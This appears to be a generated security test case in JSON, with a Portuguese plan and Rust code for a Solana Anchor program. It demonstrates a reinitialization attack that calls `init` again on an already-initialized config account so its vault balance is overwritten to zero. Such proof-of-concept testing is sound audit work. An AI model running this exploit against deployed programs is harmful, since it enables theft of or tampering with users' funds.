{
  "plan": "Preparamos uma conta `config` já inicializada (com authority, is_initialized=true e vault_balance=100) e uma carteira `authority` com lamports. O baseline chama `init` com uma conta `config` vazia (empty_account) para provar que o cenário está correto e que a instrução funciona. O ataque chama `init` novamente usando a mesma conta `config` já inicializada, tentando reescrever seu estado. O efeito verifica se a conta foi reinicializada: `is_initialized` continua true e `vault_balance` foi sobrescrito para 0 (ou authority alterado), demonstrando a sobrescrita de estado.",
  "scenario": "let authority = Pubkey::new_unique();
let config_key = Pubkey::new_unique();

// Conta config já inicializada (estado anterior)
let config_data = anchor_account_data("Config", &(authority, true, 100u64));
let config_account = account(&env.program_id, &config_data, None);

// Carteira authority com lamports
let authority_account = wallet(1_000_000_000);

// System program
let (system_program_id, system_program_account) = system_program_account();

// --- Baseline: init legítimo em conta vazia ---
let empty_config = empty_account();
let baseline_ix = env.anchor_ix(
    "init",
    &(),
    vec![
        AccountMeta::new(config_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(system_program_id, false),
    ],
);
let baseline_accounts = vec![
    (config_key, empty_config),
    (authority, authority_account.clone()),
    (system_program_id, system_program_account.clone()),
];
let baseline_result = env.baseline("init legítimo em conta vazia", &baseline_ix, &baseline_accounts);
assert!(baseline_result.program_result == ProgramResult::Success);

// --- Ataque: reinit na mesma conta já inicializada ---
let attack_ix = env.anchor_ix(
    "init",
    &(),
    vec![
        AccountMeta::new(config_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(system_program_id, false),
    ],
);
let attack_accounts = vec![
    (config_key, config_account),
    (authority, authority_account),
    (system_program_id, system_program_account),
];
let attack_result = env.attack("reinit em conta já inicializada", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let config_after = after(&attack_result, &config_key);
    let data = config_after.data();
    // Layout: 8 bytes discriminador + 32 authority + 1 is_initialized + 8 vault_balance
    let authority_after = read_pubkey(data, 8);
    let is_initialized_after = data[40] != 0;
    let vault_balance_after = read_u64(data, 41);
    env.effect(
        "conta já inicializada foi reinicializada: authority sobrescrito e vault_balance zerado",
        authority_after == authority && is_initialized_after && vault_balance_after == 0,
    );
}"
}

